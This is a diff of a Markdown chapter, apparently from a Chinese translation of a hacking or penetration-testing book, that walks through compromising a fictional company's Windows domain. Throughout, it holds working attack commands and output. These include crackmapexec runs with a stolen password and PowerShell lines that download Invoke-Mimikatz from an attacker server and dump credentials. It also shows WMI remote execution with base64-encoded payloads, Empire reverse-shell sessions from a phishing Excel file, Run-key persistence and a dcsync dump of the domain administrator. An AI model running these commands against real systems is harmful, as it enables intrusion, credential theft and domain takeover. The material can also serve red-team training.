@@ -68,36 +68,48 @@ IP 10.10.20.118绝对不是DMZ区网络的一部分。让我们试一试这个IP
 ```#bash
 FrontGun$ Proxychains nmap -n -p455,3389 10.10.20.0/24
 Starting Nmap 7.00 ( https://nmap.org ) at 2016-12-26 22:56 CET
-Nmap scan report for 10.10.20.27 445/tcp open	microsoft-ds 3389/tcp closed ms-wbt-server
+	Nmap scan report for 10.10.20.27 
+	445/tcp open	microsoft-ds 
+	3389/tcp closed ms-wbt-server
 
-Nmap scan report for 10.10.20.90 445/tcp open	microsoft-ds 3389/tcp filtered ms-wbt-server
+	Nmap scan report for 10.10.20.90 
+	445/tcp open	microsoft-ds 
+	3389/tcp filtered ms-wbt-server
 
-Nmap scan report for 10.10.20.97 445/tcp open	microsoft-ds 3389/tcp closed ms-wbt-server
+	Nmap scan report for 10.10.20.97 
+	445/tcp open	microsoft-ds 
+	3389/tcp closed ms-wbt-server
 
-Nmap scan report for 10.10.20.118 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server
+	Nmap scan report for 10.10.20.118 
+	445/tcp open microsoft-ds 
+	3389/tcp open ms-wbt-server
 
-Nmap scan report for 10.10.20.210 445/tcp open	microsoft-ds 3389/tcp filtered ms-wbt-server
+	Nmap scan report for 10.10.20.210 
+	445/tcp open	microsoft-ds 
+	3389/tcp filtered ms-wbt-server
 
-Nmap scan report for 10.10.20.254 445/tcp filtered microsoft-ds 3389/tcp filtered ms-wbt-server
+	Nmap scan report for 10.10.20.254 
+	445/tcp filtered microsoft-ds 
+	3389/tcp filtered ms-wbt-server
 ```
 
 假设我们正在从蓝区访问这些服务器，可以预见到一些端口会被过滤。
 
-在我们所有的帐户中，svc_mnt 是最有前途的帐户之一，它看起来像是一个用于管理某种应用程序的服务帐户。因此，相比其他账户，它在另一台服务器上被创建的可能性更高。我们使用该帐户启动 CME：
+在我们所有的帐户中，**svc_mnt** 是最有前途的帐户之一，它看起来像是一个用于管理某种应用程序的服务帐户。因此，相比其他账户，它在另一台服务器上被创建的可能性更高。我们使用该帐户启动 CME：
 ```#bash
 FrontGun$ proxychains crackmapexec -u svc_mnt -p Hello5\!981 -d WORKGROUP 10.10.20.27 10.10.20.90 10.10.20.97 10.10.20.118 10.10.20.210
 ```
 ![svc_mnt示意图](./Chap4/4.3-1.jpg)
 
-`提示：！在 bash 中有特殊含义，需转义，尤其是放在数字前时。因此，此处密码字段为\！。`
+`提示：！在bash中有特殊含义，需转义，尤其是放在数字前时。因此，此处密码字段为\！。`
 
-仅有几台主机像是接收svc_mnt，结果不是很好，另外，由于用户访问控制 （UAC），我们无法远程执行 Mimikatz.
+仅有几台主机像是接收**svc_mnt**，结果不是很好，另外，由于用户访问控制 （UAC），我们无法远程执行 Mimikatz.
 
 UAC是Windows vista中引入的一个功能，在执行特权操作(软件安装等)之前，会弹出一个对话框来提示用户。因此，即使管理员也不能在系统上远程执行特权命令。但默认的管理员帐户在默认状况下不受UAC的约束[69]，这就是为什么它以前没有给我们带来太多麻烦的原因。
 
-幸运的是，其中一台接受 svc_mnt的主机10.10.20.118的RDP 端口 （3389） 似乎已经打开。如果我们能在远程服务器上打开图形交互会话，那么UAC不再是问题了！
+幸运的是，其中一台接受**svc_mnt**的主机10.10.20.118的RDP 端口 （3389） 似乎已经打开。如果我们能在远程服务器上打开图形交互会话，那么UAC不再是问题了！
 
-我们在Front Gun 服务器上启动 rdesktop（或 mstsc）并访问连接 svc_mnt 帐户。
+我们在Front Gun 服务器上启动 **rdesktop**（或 **mstsc**）并访问连接**svc_mnt**帐户。
 
 ![远程桌面示意图](./Chap4/4.3-2.jpg)
 
@@ -118,9 +130,9 @@ invoke-Mimikatz
 10.10.20.118 > powershell -exec bypass .\letmein.ps1
 ```
 
-我们耐心地等待几秒钟，但DowanloadString 代码执行滞后了，似乎是10.10.20.0/24 段上的主机无法访问互联网—至少在没有通过需要有效域凭据的代理的情况下不能访问internet，而我们还没有……
+我们耐心地等待几秒钟，但**DowanloadString**代码执行滞后了，似乎是10.10.20.0/24 段上的主机无法访问互联网—至少在没有通过需要有效域凭据的代理的情况下不能访问internet，而我们还没有……
 
-为了绕过这个限制，我们将 Invoke-Mimikatz.ps1 下载到我们之前入侵的 Linux 服务器，并运行一个简单的 HTTP 服务器使其可用:
+为了绕过这个限制，我们将**Invoke-Mimikatz.ps1**下载到我们之前入侵的 Linux 服务器，并运行一个简单的 HTTP 服务器使其可用:
 ```#bash
 Career# wget https://raw.githubusercontent.com/PowerShellMafia/Powe Mimikatz.ps1
 Career# python -m SimpleHTTPServer 443
@@ -137,13 +149,13 @@ invoke-Mimikatz
 
 ![脚本执行示意图](./Chap4/4.3-3.jpg)
 
-虽然我们可能还不是域管理员，但我想你应该看到了屏幕上弹出的本地管理员的密码：Dom_M_ster_P_ssword1。
+虽然我们可能还不是域管理员，但我想你应该看到了屏幕上弹出的本地管理员的密码：**Dom_M_ster_P_ssword1**。
 
 看来域计算机与非域计算机具有不同的本地管理员帐户。 现在酷的是我们可以在所有共享这个相同管理员帐户的机器上执行一个Mimikatz。 当然，有时会命中，有时却会丢失，但是我们只需要在正确的时间在正确的计算机上连接一个域特权帐户即可！
 
 通过DMZ区内控制的Front Gun服务器上建立的socks代理，我们将直接从10.10.20.118服务器执行minikatz，而不是通过CrackMapExec。这样我们就可以完全绕过防火墙的限制。(CME依赖RPC端口：135、49152到65535来远程执行Mimikatz，但在DMZ和内网之间的防火墙不太可能允许这样做。)
 
-我们使用获得的管理员帐户打开 RDP 会话，并通过添加 -Computer switch修改脚本以支持在多台计算机上执行：
+我们使用获得的管理员帐户打开 RDP 会话，并通过添加**-Computer** switch修改脚本以支持在多台计算机上执行：
 ```#bash
 $browser = New-Object System.Net.WebClient
 
@@ -152,18 +164,20 @@ IEX($browser.DownloadString("http://192.168.1.46:443/I Mimikatz.ps1"))
 invoke-mimikatz -Computer FRSV27,FRSV210,FRSV229,FRSV97 |out-file result.txt -Append
 ```
 
-这一次，Invoke-Mimikatz 将使用远程 PowerShell 执行创建远程线程（端口 5985 上的 WinRM 服务），然后将结果存储在result.txt 中。
+这一次，**Invoke-Mimikatz**将使用远程 PowerShell 执行创建远程线程（端口 5985 上的 WinRM 服务），然后将结果存储在result.txt 中。
 
-`提示：当使用远程PowerShell执行时，应总是指定服务器的名称而不是IP地址(使用nslookup)。`
+补充说明：
 
-`提示： 如果未启用远程 PowerShell（端口 5985），我们可以使用 Windows 计算机的 WMI 命令修复它： wmic /user:administrator /password: Dom_M@ster_P@ssword1 /node:10.10.20.229 process call create " powershell enable-PSRemoting -force "`
+当使用远程PowerShell执行时，应总是指定服务器的名称而不是IP地址(使用nslookup)。
+
+如果未启用远程 PowerShell（端口 5985），我们可以使用 Windows 计算机的 WMI 命令修复它： wmic /user:administrator /password: Dom_M@ster_P@ssword1 /node:10.10.20.229 process call create " powershell enable-PSRemoting -force "`
 
 ![xx示意图](./Chap4/4.3-4.jpg)
 
-你看看！我们已经收集到 60 多个密码。果然，我们发现一个可能具有有趣特权的帐户：adm_supreme。然后，我们查询"域管理员"组进一步确认：:
+你看看！我们已经收集到 60 多个密码。果然，我们发现一个可能具有有趣特权的帐户：**adm_supreme**。然后，我们查询"域管理员"组进一步确认：
 ![xx示意图](./Chap4/4.3-5.jpg)
 
-确实属于"域管理员"组。我们攻下了！
+**adm_supreme**确实属于"域管理员"组。我们攻下了！
 
 `提示：查询域资源（组，用户等）时，请记住必须使用有效的域帐户。 在上面的屏幕中，在执行“ net group”命令之前，我们使用adm_supreme帐户重新连接到10.10.20.118。`
 
@@ -175,12 +189,13 @@ invoke-mimikatz -Computer FRSV27,FRSV210,FRSV229,FRSV97 |out-file result.txt -Ap
 我们的想法是创建一个行的PowerShell命令执行Mimikatz和转储内容到本地文件。 我们使用WMI远程启动此代码，等待几秒钟，然后在我们的计算机上检索文件。
 
 接下来我们一步一步地分析：
+
 1. 我们稍微更改以前的代码，将目标的 IP 地址包含在输出的文件名中:
+
 ```#bash
 $browser = New-Object System.Net.WebClient
-
 IEX($browser.DownloadString("http://192.168.1.46:443/I Mimikatz.ps1"))
-
+$machine_name = (get-netadapter | get-netipaddress | ? addressfamily -eq "IPv4").ipaddress invoke-mimikatz | out-file c:\windows\temp\$machine_name".txt"
 ```
 2. 我们将每个换行符更改为“;”，然后将此脚本放入PowerShell脚本的变量中：
 ```#bash
@@ -200,17 +215,17 @@ PS> invoke-wmimethod -ComputerName $X win32_process -name create -argumentlist (
 ```
 PS> move-item -path "\\$X\C$\windows\temp\$X.txt" - Destination C:\users\Administrator\desktop\ -force
 ```
-6. 下面包含完整的脚本和一个小的附加代码片段，该附加代码段将等到远程进程完成后才检索结果:
+以下是整个脚本和一个小的附加代码片段，该附加代码段将等到远程进程完成后才检索结果:
+
 ```#bash
 $command = '$browser = New-Object System.Net.WebClient;IEX($browser.DownloadString("htt Mimikatz.ps1"));$machine_name = (get-netadapter | get- netipaddress | ? addressfamily -eq "IPv4").ipaddress;invoke-mimikatz | out-file c:\windows\temp\$machine_name".txt"'
+
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
 $encodedCommand = [Convert]::ToBase64String($bytes)
 
 $PC_IP = @("10.10.20.229", "10.10.20.97")
 
-
 ForEach ($X in $PC_IP) {
- 
 $proc = invoke-wmimethod -ComputerName $X win32_process -name create -argumentlist ("powershell - encodedcommand $encodedCommand")
 $proc_id = $proc.processId
 
@@ -220,12 +235,13 @@ until ((Get-WMIobject -Class Win32_process -Filter "ProcessId=$proc_id" -Compute
 Destination C:\users\Administrator\desktop\ -force
 write-host "[+] Got file for $X" -foregroundcolor "green"
 }
-
 ```
 
 ## 4.4 遗漏的环节
 
 还记得我们的网络钓鱼活动吗？当我们忙于同时购买机器和域时，员工们欣喜地打开我们的Excel文件。
+
+![xx示意图](./Chap4/4.4-1.jpg)
 
 尽管我们现在控制着SPH网络上的所有资源，但让我们看看如何通过用户工作站来达到相同的结果。
 
@@ -233,30 +249,37 @@ write-host "[+] Got file for $X" -foregroundcolor "green"
 
 我们与随机目标互动，并列出有关环境的基本信息：
 ```#bash
-(Empire) > interact D1GAMGTVCUM2FWZC (Empire: D1GAMGTVCUM2FWZC) > sysinfo
-Listener:	http://<front-gun>:80 Internal IP:		10.10.20.54
-Hostname:	FRPC054
-OS:	Microsoft Windows 10 Pro High Integrity:	0
-Process Name:		powershell Process ID:	3404
-PSVersion:	5
-(Empire: D1GAMGTVCUM2FWZC) > rename mike (Empire: mike) >
+(Empire) > interact D1GAMGTVCUM2FWZC
+(Empire: D1GAMGTVCUM2FWZC) > sysinfo
+	Listener:	http://<front-gun>:80 
+	Internal IP:		10.10.20.54
+	Username:	SPH\mike
+	Hostname:	FRPC054
+	OS:	Microsoft Windows 10 Pro High Integrity:	0
+	Process Name:		powershell Process ID:	3404
+	PSVersion:	5
+(Empire: D1GAMGTVCUM2FWZC) > rename mike 
+(Empire: mike) >
 ```
-
 反向shell由后台运行的PowerShell进程托管。即使用户关闭了Excel文档，我们仍然保留对其计算机的访问权限。当然，简单的重启会杀死我们的代理。因此，在继续之前，我们需要采取一些预防措施。
 
 在每次新登录时，Windows都会查找一些注册表项，并盲目执行许多程序。我们将使用这些注册表项之一来存储PowerShell脚本，该脚本将在Mike每次重新启动计算机时重新连接。
-`(Empire:mike)> usemodule persistence/userland/registry`
-`(Empire : persistence/userland/registry) > set Listener test`
 
-这个特定的模块使用RUN键来实现持久性（HKCU \ Software \ Microsoft \ Windows \ CurrentVersion \ Ru是无数恶意软件使用的已知方法）。这远不是我们所能想出的最隐秘的方法，但鉴于我们在工作站上的特权有限，我们暂时无法真正负担得起一些性感。
+```#bash
+(Empire:mike)> usemodule persistence/userland/registry
+(Empire : persistence/userland/registry) > set Listener test
+(Empire : persistence/userland/registry) > run
+```
+这个特定的模块使用RUN键来实现持久性*（HKCU \ Software \ Microsoft \ Windows \ CurrentVersion \ Ru*是无数恶意软件使用的已知方法）。这远不是我们所能想出的最隐秘的方法，但鉴于我们在工作站上的特权有限，我们暂时无法真正负担得起一些性感。
 
 提示：只需更改模块中的目标“设置代理XXXXX”，即可在所有其他代理上盲目执行此模块。
 
 现在，我们已经涵盖了这一点，我们希望定位的用户更有可能在域上具有某些管理特权，或者至少具有对某些服务器的访问权。一个明显的目标是IT支持部门。我们要求Active Directory列出在该部门注册的员工：
 ```
-(Empire: mike) > usemodule situational_awareness/network/powerview/get_user (Empire: mike)  > set filter department=IT* (Empire: mike) > run
+(Empire: mike) > usemodule situational_awareness/network/powerview/get_user
+(Empire: mike) > set filter department=IT* 
+(Empire: mike) > run
 Job started: Debug32_45g1z
-
 company	: SPH
 department	: IT support
 displayname	: Holly 
@@ -275,22 +298,25 @@ lastlogon : 12/31/2016 8:05:47 AM
 ```
 (Empire:) > interact H3PBLVYYS3SYNBMA
 (Empire H3PBLVYYS3SYNBMA :) > rename john
-(Empire: john) > shell net localgroup administrators Alias name	administrators
-Members
-
-------------------------------------------------------
-adm_wkt Administrator
+(Empire: john) > shell net localgroup administrators
+	Alias name	administrators
+	Members
+	
+	------------------------------------------------------
+	adm_wkt
+	Administrator
 ```
 
 尽管 John 是 IT 经理，但他的工作站上没有管理员权限。很好，有些挑战！
 
 从这里可以采取多种途径：查找漏洞，配置错误的服务，文件或注册表项中的密码等。
 
-在撰写本书时，非常流行的一种利用是利用MS016-32 [71]漏洞。触发代码是用PowerShell编写的，非常适合我们当前的情况。但是，我们并不总是拥有进行公开漏洞利用的奢侈，因此我们将走更可靠的道路。
+在撰写本书时，非常流行的一种利用是利用**MS016-32** [71]漏洞。触发代码是用PowerShell编写的，非常适合我们当前的情况。但是，我们并不总是拥有进行公开漏洞利用的奢侈，因此我们将走更可靠的道路。
 
-我们运行 PowerUp 模块，该模块在 Windows 上执行常规检查，以确定提升计算机特权的可行路径：
+我们运行**PowerUp**模块，该模块在 Windows 上执行常规检查，以确定提升计算机特权的可行路径：
 ```
-(Empire: john) > usemodule privesc/powerup/allchecks (Empire: privesc/powerup/allchecks) > run
+(Empire: john) > usemodule privesc/powerup/allchecks 
+(Empire: privesc/powerup/allchecks) > run
 (Empire: privesc/powerup/allchecks) >
 Job started: Debug32_m71k0
 
@@ -307,20 +333,19 @@ Job started: Debug32_m71k0
 ```
 (Empire: john) > shell schtasks /query /fo LIST /v 
 (Empire: john) >
-Folder: \
-HostName:	FRPC073
-TaskName:	\Chance screensaver
-Next Run Time:		N/A 
-Status:	Ready
-Logon Mode:		Interactive/Background 
-Last Run Time:		1/15/2017 1:58:22 PM 
-Author:	SPH\adm_supreme
-Task To Run:
-C:\Apps\screensaver\launcher.bat 
-Comment:	Change screensaver 
-Scheduled Task State:		Enabled
-Run As User:	Users
-Schedule Type:	At logon time
+	Folder: \
+	HostName:	FRPC073
+	TaskName:	\Chance screensaver
+	Next Run Time:		N/A 
+	Status:	Ready
+	Logon Mode:		Interactive/Background 
+	Last Run Time:		1/15/2017 1:58:22 PM 
+	Author:		SPH\adm_supreme
+	Task To Run:	C:\Apps\screensaver\launcher.bat 
+	Comment:	Change screensaver 
+	Scheduled Task State:		Enabled
+	Run As User:	Users
+	Schedule Type:	At logon time
 ```
 
 有趣的是，任务计划在用户每次登录工作站时定期更新他们的屏幕保护程序。
@@ -374,8 +399,7 @@ PS> write-host $encodedCommand JABiAHIAbwB3AHMAZQByACAAPQAgAE4AZQB3A
 FrontGun$ cat pass_file.txt
 
 Hostname: FRPC073.sph.corp / -
-.#####.	mimikatz 2.1 (x64) built on Mar 31 2016
-16:45:32
+.#####.	mimikatz 2.1 (x64) built on Mar 31 2016 16:45:32
 .## ^ ##. "A La Vie, A L'Amour" ## / \ ## /* * *
 ##	\	/	##	Benjamin	DELPY	`gentilkiwi`	( benjamin@gentilkiwi.com )
 '## v ##'	http://blog.gentilkiwi.com/mimikatz (oe.eo)
@@ -450,7 +474,7 @@ PS> $browser = New-Object System.Net.WebClient
 PS> IEX($browser.DownloadString("http://192.168.1.90:443/IMimikatz.ps1"))
 PS> invoke-mimikatz -Command '"lsadump::dcsync/domain:sph.corp /user:administrator"'
 ```
-![xxx示意图](./Chap4/4.4-5.jpg)
+![xxx示意图](./Chap4/4.5-1.jpg)
 
 使用此帐号，我们将永不再受UAC的约束!我们对每个我们感兴趣的域帐户遍历此命令。我们可以通过传递Hash来冒充这些用户。
 
